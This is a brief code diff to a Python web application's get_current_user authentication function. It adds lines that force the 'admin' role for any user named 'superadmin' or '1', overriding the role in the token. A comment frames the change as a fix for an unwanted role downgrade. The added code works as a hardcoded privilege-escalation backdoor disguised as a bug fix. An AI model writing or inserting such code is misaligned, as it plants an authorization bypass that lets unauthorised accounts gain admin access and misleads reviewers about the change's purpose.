@@ -50,6 +50,10 @@ def get_current_user(db: Session = Depends(get_db), token: str = Depends(oauth2_
         fullname = fullname_from_token or username
 
         role = payload.get("role") or "user"
+        
+        # Force admin role for superadmin accounts to avoid JIT downgrade
+        if username.lower() in ["superadmin", "1"]:
+            role = "admin"
 
         
         token_data = TokenData(username=username)
